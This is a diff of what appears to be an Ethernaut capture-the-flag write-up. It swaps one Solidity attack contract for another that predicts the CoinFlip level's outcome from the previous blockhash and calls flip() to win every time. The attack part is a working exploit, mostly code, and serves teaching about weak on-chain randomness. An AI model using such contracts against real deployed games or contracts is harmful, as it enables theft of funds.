@@ -18,27 +18,33 @@ await contract.sendAllocation(await contract.owner());
 ## 3. Coinflip
 Don't rely on block number for any validation logic. I can calculate solution if both our txn in the same block and pass the result to your contract!
 ``` 
-pragma solidity ^0.4.24;
+pragma solidity ^0.6.0;
 import "./CoinFlip.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";
 
-contract CoinFlipSoln {
-    CoinFlip private _victim;
-    uint256 private lastHash;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-    constructor(address _address) public {
-        _victim = CoinFlip(_address);
+contract AttackCoinFlip {
+    using SafeMath for uint;
+    
+    address public targetContract;
+    
+    constructor(address _targetContract) public {
+        targetContract = _targetContract;
     }
     
-    function hackIt() public {
-    uint256 blockValue = uint256(blockhash(block.number - 1));
-
-    lastHash = blockValue;
-    uint256 coinFlip = blockValue / FACTOR;
-    bool side = coinFlip == 1 ? true : false;
-    _victim.flip(side);
-
-  }
+    function attackFlipWithContract() public{
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
+        bool side = coinFlip == 1 ? true : false;
+        CoinFlip(targetContract).flip(side);
+    }
+    
+    function attackFlipWithout() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
+        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
+        (bool success, ) = targetContract.call(payload);
+        require(success, "Transaction call using encodeWithSignature is successful");
+    }
 }
 ```
 
